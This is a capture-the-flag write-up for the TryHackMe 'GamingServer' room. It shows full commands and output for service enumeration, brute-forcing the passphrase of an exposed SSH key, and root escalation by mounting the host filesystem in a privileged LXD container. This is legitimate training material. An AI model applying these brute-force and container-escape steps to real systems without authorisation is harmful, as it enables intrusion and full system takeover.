# THM - GamingServer Writeup

> Mario Raciti | Sep 1, 2020
>
> TryHackMe CTF Room: https://tryhackme.com/room/gamingserver

### An Easy Boot2Root box for beginners

The aim of this room is to gain access to a gaming server built by amateurs with no experience of web development and to take advantage of the deployment system.

There is only one task, indicating that we have to get two flags: `user_flag` and `root_flag`. So without any further ado, let's begin our game!

## Nmap Scan

Let's start this room by running a classic nmap scan:

```sh
$ nmap -sC -sV $IP -oN logs/nmap

Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-31 17:09 CEST
Stats: 0:00:09 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Nmap scan report for 10.10.26.252
Host is up (0.078s latency).
Not shown: 921 closed ports, 77 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.45 seconds
```

Well, it seems we have only two open ports: `22 (SSH)` and `80 (HTTP)`.

## Web Directories Enumeration

Let's start by visiting the homepage of the web server listening on port 80. By inspecting the source page, we can notice that it contains the following comment at the footer:

```html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

Thus, we can guess that a candidate username for an SSH login could be `john`.

Now let's give a look if the web server provides a `robots.txt` file:

```
GET http://$IP/robots.txt

user-agent: *
Allow: /
/uploads/
```

We can see the `/uploads` endpoint, so let's investigate about:

```
GET http://$IP/uploads/

dict.lst	2020-02-05 14:10	2.0K	 
manifesto.txt	2020-02-05 13:05	3.0K	 
meme.jpg	2020-02-05 13:32	15K	 
```

The `dict.lst` file seems to contain a password list. Maybe this list could be used to bruteforce the SSH login.

### Gobuster

Before going ahed, let's enumerate directories using Gobuster with the [common.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/common.txt) list:

```sh
$ gobuster dir --url $IP -w common.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.26.252
[+] Threads:        10
[+] Wordlist:       common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/31 17:44:37 Starting gobuster
===============================================================
/secret (Status: 301)
/uploads (Status: 301)
===============================================================
2020/08/31 17:45:03 Finished
===============================================================
```

As we can see, the tool found only two directories: `/secret` and `/uploads`. We already checked the latter, so we can concentrate our analysis on the `/secret` endpoint:

```
GET http://$IP/secret/

secretKey	2020-02-05 13:41	1.7K
```

Bingo! We got a private RSA SSH key:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

*******************************************
***********CENSORED_EH_EH******************
*******************************************
-----END RSA PRIVATE KEY-----
```

## SSH Dictionary Attack

The SSH RSA private key is encrypted, so we have to crack the password. To this purpose, we can surely use the `dict.lst` list that we found previously. Note that this operation can be performed by using our old friend JohnTheRipper, but in this case I preferred to use the SSHAttacker Python script - source is available [here](https://github.com/forScie/SSHAttacker) - to think *out of the box*. Before starting the cracking process, I just added the `key_name='rsa_id'` parameter to the connect method in the script, in order to adapt it to our use case:

```python
line 36	   ssh.connect(target, port=int(float(port)), username=user, password=password, key_filename='./rsa_id')
```

At this point, we can simply run SSHAttacker with `dict.lst` as password list:

```
...
[-] Attempt n-1: ***censored*** ... Unsuccessful
[-] Attempt n: ***password_eheh*** ... Bingo!

[!] SUCCESS! Creds: john@10.10.165.124:22 Password: ***password_eheh***
```

We got the password and, after logging in via SSH, we can finally retrieve the user flag:

```sh
john@exploitable:~$ ls
user.txt
john@exploitable:~$ cat user.txt
***user_flag***
```

## Privilege Escalation

Now we have to elevate our privileges in order to get the root flag. We can just scp and run the [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) script in the VM to look for something interesting.
I firstly noticed that there is a weird link in a `/usr/bin/at` binary. But it was a joke just as `/usr/bin/pkexec`, another potential way to elevate our privileges. Both refers to CVEs which can be exploited by using a C executable, FYI.

At this point, I was looking for the right way to perform a privilege escalation. We can notice that the user john is in the lxd group:

```sh
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

We can exploit this fact because LXD containers run with root privileges in most cases. Therefore, the exploit consts of mounting the file system in a container, so that we can have access to it. For more information, you can read [this article](https://www.hackingarticles.in/lxd-privilege-escalation/). In our case, we can use the alpine image:

```sh
attacker@machine:~$ git clone https://github.com/saghul/lxd-alpine-builder.git
attacker@machine:~$ cd lxd-alpine-builder/
attacker@machine:~$ sudo ./build-alpine -a i686
```

Now we have to move the `alpine-v3.12-i686-20200901_1306.tar.gz` archive to the victim machine:

```sh
attacker@machine:~$ scp -i rsa_id alpine-v3.12-i686-20200901_1306.tar.gz john@10.10.170.65:/home/john/
```

Eventually, all we have to do is to just add the image as follows:

```sh
john@exploitable:~$ lxc image import alpine-v3.12-i686-20200901_1306.tar.gz --alias exploit_image
Image imported with fingerprint: dc53ca24314f0dee7e940d9e9519215a725b761e8e6ad98
john@exploitable:~$ lxc image list
+---------------+--------------+--------+-------------------------------+------+--------+-----------------------------+
|     ALIAS     | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCH |  SIZE  |         UPLOAD DATE         |
+---------------+--------------+--------+-------------------------------+------+--------+-----------------------------+
| exploit_image | dc53ca24314f | no     | alpine v3.12 (20200901_13:06) | i686 | 3.07MB | Sep 1, 2020 at 1:17pm (UTC) |
+---------------+--------------+--------+-------------------------------+------+--------+-----------------------------+
```

We can now run the container from the `exploit_image` image:

```sh
john@exploitable:~$ lxc init exploit_image ignite -c security.privileged=true
Creating ignite
john@exploitable:~$ lxc config device add ignite my_device disk source=/ path=/mnt/root recursive=true
Device my_device added to ignite
john@exploitable:~$ lxc start ignite
john@exploitable:~$ lxc exec ignite /bin/sh
~ # whoami
root
```

And voilà!

The root flag can be retrieved by going to the mounted path `/mnt/root/root`:

```sh
~ # cd /mnt/root/root
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt 
***root_flag***
```

---

### That's all folks!
